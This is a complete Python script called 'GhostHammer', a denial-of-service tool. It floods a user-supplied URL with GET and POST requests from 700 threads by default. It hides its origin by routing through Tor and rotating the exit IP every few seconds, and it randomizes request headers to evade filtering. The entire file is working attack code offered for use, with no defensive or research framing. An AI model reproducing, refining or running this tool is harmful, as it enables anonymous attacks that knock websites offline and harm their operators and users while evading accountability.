import threading
import requests
import time
import os
import sys
import socket
import random
import subprocess
import platform
from stem import Signal
from stem.control import Controller

stop_event = threading.Event()

# Counters
total_requests = 0
success_get = 0
success_post = 0
failed_requests = 0
lock = threading.Lock()

# User-Agent, Referers, Languages, Encodings
ua_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (Linux; Android 11)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)'
]
referers = ['https://google.com/', 'https://facebook.com/', 'https://twitter.com/', 'https://youtube.com/']
lang_list = ['en-US,en;q=0.9', 'tr-TR,tr;q=0.8']
enc_list = ['gzip, deflate', 'br', 'identity']

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("""
╔════════════════════════════════════╗
║             GhostHammer            ║
╠════════════════════════════════════╣
║ 🌐 GET + POST Flooding             ║
║ 🔐 Anonymity via TOR               ║  
║ 🧱 Compatible with Termux & Linux  ║ 
║ ---------------------------------  ║
║     💻 Coder By Mr.SenihX          ║ 
╚════════════════════════════════════╝
""")

def detect_environment():
    if 'com.termux' in os.environ.get('PREFIX', '') or 'ANDROID_ROOT' in os.environ:
        return "termux"
    elif platform.system() == "Linux":
        return "linux"
    return "unknown"

def get_torrc_path(env):
    if env == "termux":
        return os.path.expanduser("~/.tor/torrc")
    elif env == "linux":
        return os.path.expanduser("~/.tor_flood/torrc")
    return None

def write_torrc_if_missing(path):
    torrc_content = """
ControlPort 9051
CookieAuthentication 1
SocksPort 9050
AvoidDiskWrites 1
StrictNodes 1
ExitNodes {us},{de},{nl}
ExcludeNodes {cn},{ir},{ru}
"""
    if not os.path.exists(path):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(torrc_content.strip())

def start_tor(path):
    print("[🌀] Starting Tor...")
    try:
        subprocess.Popen(["tor", "-f", path])
        time.sleep(7)
    except Exception as e:
        print(f"[!] Failed to start Tor: {e}")
        sys.exit(1)

def is_tor_running():
    try:
        socket.create_connection(("127.0.0.1", 9050), timeout=3)
        return True
    except:
        return False

def get_current_ip():
    try:
        r = requests.get("http://ip-api.com/json", proxies={
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }, timeout=5)
        data = r.json()
        return f"{data.get('query')} ({data.get('country')})"
    except:
        return "Unknown"

def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("[🔄] Changing IP...")
            time.sleep(3)
            print(f"[✔] New IP: {get_current_ip()}")
    except Exception as e:
        print(f"[!] Failed to renew IP: {e}")

def attack_thread(url, payload, thread_id):
    global total_requests, success_get, success_post, failed_requests
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    while not stop_event.is_set():
        headers = {
            'User-Agent': random.choice(ua_list),
            'Referer': random.choice(referers),
            'Accept-Language': random.choice(lang_list),
            'Accept-Encoding': random.choice(enc_list),
        }
        try:
            r_get = session.get(url, headers=headers, timeout=10)
            with lock:
                total_requests += 1
                success_get += 1 if r_get.status_code == 200 else 0
            print(f"[Thread-{thread_id}] GET {r_get.status_code}")

            if payload:
                r_post = session.post(url, data=payload, headers=headers, timeout=10)
                with lock:
                    total_requests += 1
                    success_post += 1 if r_post.status_code == 200 else 0
                print(f"[Thread-{thread_id}] POST {r_post.status_code}")

        except requests.exceptions.RequestException as e:
            with lock:
                failed_requests += 1
            print(f"[Thread-{thread_id}] Error: {e}")

        time.sleep(random.uniform(1.0, 3.0))

def show_stats():
    while not stop_event.is_set():
        time.sleep(10)
        with lock:
            print(f"\n📊 Total: {total_requests} | GET: {success_get} | POST: {success_post} | Failed: {failed_requests}")

def get_inputs():
    clear()
    banner()
    url = input("🌐 Target URL (must start with http/https): ").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        print("[!] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    payload = {'test': 'ghost'}

    thread_input = input("🔁 Number of threads [default=700]: ").strip()
    interval_input = input("⏱️ IP change interval (sec) [default=3]: ").strip()

    thread_count = int(thread_input) if thread_input else 700
    interval = int(interval_input) if interval_input else 3

    return url, payload, thread_count, interval

def main():
    env = detect_environment()
    torrc_path = get_torrc_path(env)
    write_torrc_if_missing(torrc_path)

    if not is_tor_running():
        start_tor(torrc_path)

    url, payload, thread_count, interval = get_inputs()
    print("\n[🚀] Attack started... (Press Ctrl+C to stop)")

    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=attack_thread, args=(url, payload, i))
        t.start()
        threads.append(t)

    stat_thread = threading.Thread(target=show_stats)
    stat_thread.start()

    try:
        while not stop_event.is_set():
            renew_tor_ip()
            for _ in range(interval):
                if stop_event.is_set():
                    break
                time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()

    for t in threads:
        t.join()
    print("[✓] Stopped.")

if __name__ == "__main__":
    main()
